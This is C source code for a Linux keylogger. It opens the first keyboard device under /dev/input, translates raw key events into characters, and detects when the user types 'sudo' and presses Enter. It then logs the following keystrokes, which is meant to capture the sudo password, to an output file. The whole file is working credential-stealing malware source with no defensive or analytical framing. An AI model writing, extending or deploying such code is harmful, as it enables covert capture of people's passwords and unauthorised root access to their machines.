#include "../includes/keyLogger.h"

char *findKeyboardDevice()
{
  FILE *fp;
  char path[BUFFER_SIZE];
  char *device = NULL;

  fp = popen("ls /dev/input/by-path/*kbd* | head -n 1", "r");
  if (fp == NULL)
  {
    DEBUG_MODE == 1 ? printf("\n") : 0;
    return NULL;
  }

  if (fgets(path, sizeof(path), fp) != NULL)
  {
    size_t len = strlen(path);
    if (len > 0 && path[len - 1] == '\n')
    {
      path[len - 1] = '\0';
    }
    device = strdup(path);
  }

  pclose(fp);
  return device;
}

char *printKey(KeyLogger *keyLogger)
{
  char *key = NULL;

  switch (keyLogger->ev.code)
  {
  // Numbers
  case 2:
    key = "1";
    break;
  case 3:
    key = "2";
    break;
  case 4:
    key = "3";
    break;
  case 5:
    key = "4";
    break;
  case 6:
    key = "5";
    break;
  case 7:
    key = "6";
    break;
  case 8:
    key = "7";
    break;
  case 9:
    key = "8";
    break;
  case 10:
    key = "9";
    break;
  case 11:
    key = "0";
    break;

    // Letters -> layout QWERTY
  case 16:
    key = keyLogger->inCapsLock ? "Q" : "q";
    break;
  case 17:
    key = keyLogger->inCapsLock ? "W" : "w";
    break;
  case 18:
    key = keyLogger->inCapsLock ? "E" : "e";
    break;
  case 19:
    key = keyLogger->inCapsLock ? "R" : "r";
    break;
  case 20:
    key = keyLogger->inCapsLock ? "T" : "t";
    break;
  case 21:
    key = keyLogger->inCapsLock ? "Y" : "y";
    break;
  case 22:
    key = keyLogger->inCapsLock ? "U" : "u";
    break;
  case 23:
    key = keyLogger->inCapsLock ? "I" : "i";
    break;
  case 24:
    key = keyLogger->inCapsLock ? "O" : "o";
    break;
  case 25:
    key = keyLogger->inCapsLock ? "P" : "p";
    break;
  case 30:
    key = keyLogger->inCapsLock ? "A" : "a";
    break;
  case 31:
    key = keyLogger->inCapsLock ? "S" : "s";
    break;
  case 32:
    key = keyLogger->inCapsLock ? "D" : "d";
    break;
  case 33:
    key = keyLogger->inCapsLock ? "F" : "f";
    break;
  case 34:
    key = keyLogger->inCapsLock ? "G" : "g";
    break;
  case 35:
    key = keyLogger->inCapsLock ? "H" : "h";
    break;
  case 36:
    key = keyLogger->inCapsLock ? "J" : "j";
    break;
  case 37:
    key = keyLogger->inCapsLock ? "K" : "k";
    break;
  case 38:
    key = keyLogger->inCapsLock ? "L" : "l";
    break;
  case 44:
    key = keyLogger->inCapsLock ? "Z" : "z";
    break;
  case 45:
    key = keyLogger->inCapsLock ? "X" : "x";
    break;
  case 46:
    key = keyLogger->inCapsLock ? "C" : "c";
    break;
  case 47:
    key = keyLogger->inCapsLock ? "V" : "v";
    break;
  case 48:
    key = keyLogger->inCapsLock ? "B" : "b";
    break;
  case 49:
    key = keyLogger->inCapsLock ? "N" : "n";
    break;
  case 50:
    key = keyLogger->inCapsLock ? "M" : "m";
    break;

  // Special characters
  case 12:
    key = "-";
    break;
  case 13:
    key = "=";
    break;
  case 14:
    key = "Backspace";
    break;
  case 15:
    key = "Tab";
    break;
  case 28:
    key = "Enter";
    break;
  case 29:
    key = "Ctrl";
    break;
  case 42:
    key = "Shift";
    break;
  case 43:
    key = "\\";
    break;
  case 57:
    key = "Space";
    break;
  case 58:
    key = "CapsLock";
    keyLogger->inCapsLock = keyLogger->inCapsLock == 0 ? 1 : 0;
    break;

  default:
  {
    key = NULL;
    break;
  }
  }

  return key;
}

void writeToFile(KeyLogger *keyLogger)
{
  if (keyLogger->ev.type == EV_KEY && keyLogger->ev.value == 1)
  {

    FILE *file = fopen(FILE_OUTPUT, "a");
    if (file == NULL)
    {
      DEBUG_MODE == 1 ? fprintf(stderr, "file not open %s\n", FILE_OUTPUT) : 0;
      return;
    }

    switch (keyLogger->ev.code)
    {
    case KEY_ENTER:
      fprintf(file, "%s", "(Enter)\n");
      break;
    case KEY_SPACE:
      fprintf(file, "%s", " ");
      break;
    case KEY_BACKSPACE:
      fprintf(file, "%s", "(Backspace)");
      break;
    case KEY_TAB:
      fprintf(file, "%s", "    ");
      break;
    default:
    {
      char *text = printKey(keyLogger);
      fprintf(file, "%s", text);
      break;
    }
    }

    fclose(file);
  }
}

KeyLogger *createKeyLogger()
{
  KeyLogger *keyLoger = (KeyLogger *)malloc(sizeof(KeyLogger));
  if (keyLoger == NULL)
  {
    return NULL;
  }

  keyLoger->currentWord = NULL;
  keyLoger->inCapsLock = 0;
  keyLoger->inShift = 0;
  keyLoger->ev = (struct input_event){0};
  keyLoger->inSudoCommand = 0;
  keyLoger->listen = 0;

  return keyLoger;
}

void mountWord(KeyLogger *keyLogger)
{
  if (keyLogger->ev.code == KEY_SPACE || keyLogger->ev.code == KEY_TAB)
  {
    free(keyLogger->currentWord);
    keyLogger->currentWord = NULL;
    return;
  }

  char *text = printKey(keyLogger);
  if (text == NULL)
  {
    return;
  }

  if (keyLogger->ev.code == KEY_BACKSPACE)
  {
    if (keyLogger->currentWord != NULL && strlen(keyLogger->currentWord) > 0)
    {
      keyLogger->currentWord[strlen(keyLogger->currentWord) - 1] = '\0';
    }
    return;
  }

  if (keyLogger->ev.code == KEY_ENTER)
  {
    analyzeWord(keyLogger);
    free(keyLogger->currentWord);
    keyLogger->currentWord = NULL;
    return;
  }

  if (keyLogger->currentWord == NULL)
  {
    keyLogger->currentWord = (char *)malloc(BUFFER_SIZE * sizeof(char));
    if (keyLogger->currentWord == NULL)
    {
      return;
    }
    keyLogger->currentWord[0] = '\0';
  }
  else
  {
    size_t len = strlen(keyLogger->currentWord);
    if (len > BUFFER_SIZE)
    {
      free(keyLogger->currentWord);
      keyLogger->currentWord = NULL;
      return;
    }
  }

  strcat(keyLogger->currentWord, text);

  if (DEBUG_MODE == 1)
  {
    printf("Word: %s\n", keyLogger->currentWord);
  }
}

void analyzeWord(KeyLogger *keyLogger)
{
  if (keyLogger->currentWord == NULL)
  {
    return;
  }

  // check if the word is "sudo"
  if (strcmp(keyLogger->currentWord, "sudo") == 0)
  {
    keyLogger->inSudoCommand = 1;
  }

  if (keyLogger->ev.code == KEY_ENTER && keyLogger->inSudoCommand == 1)
  {
    keyLogger->inSudoCommand = 0;
    keyLogger->listen = 1;
  }
  else if (keyLogger->ev.code == KEY_ENTER && keyLogger->inSudoCommand == 0)
  {
    keyLogger->listen = 0;
  }
}

void startKeyLogger(KeyLogger *keyLogger)
{
  char *device = findKeyboardDevice();
  if (device == NULL)
  {
    DEBUG_MODE == 1 ? fprintf(stderr, "Not found keyboard\n") : 0;
    return;
  }

  DEBUG_MODE == 1 ? printf("Not found keyboard: %s\n", device) : 0;

  int fd = open(device, O_RDONLY);
  if (fd < 0)
  {
    DEBUG_MODE == 1 ? fprintf(stderr, "Not found keyboard %s\n", device) : 0;
    free(device);
    return;
  }

  struct input_event ev;
  while (1)
  {
    ssize_t n = read(fd, &ev, sizeof ev);
    if (n == (ssize_t)-1)
    {
      DEBUG_MODE == 1 ? perror("Error in event") : 0;
      close(fd);
      free(device);
      return;
    }
    else if (n != sizeof ev)
    {
      DEBUG_MODE == 1 ? fprintf(stderr, "Wrong length\n") : 0;
      close(fd);
      free(device);
      return;
    }

    if (ev.type == EV_KEY && ev.value == 1)
    {
      keyLogger->ev = ev;
      mountWord(keyLogger);
      analyzeWord(keyLogger);

      if (keyLogger->listen == 1)
      {
        writeToFile(keyLogger);
      }
    }
  }

  close(fd);
  free(device);
}

void destroyKeyLogger(KeyLogger *keyLogger)
{
  free(keyLogger);
}

int main()
{
  KeyLogger *keyLogger = createKeyLogger();

  if (keyLogger == NULL)
  {
    return 1;
  }

  startKeyLogger(keyLogger);
  return 0;
}
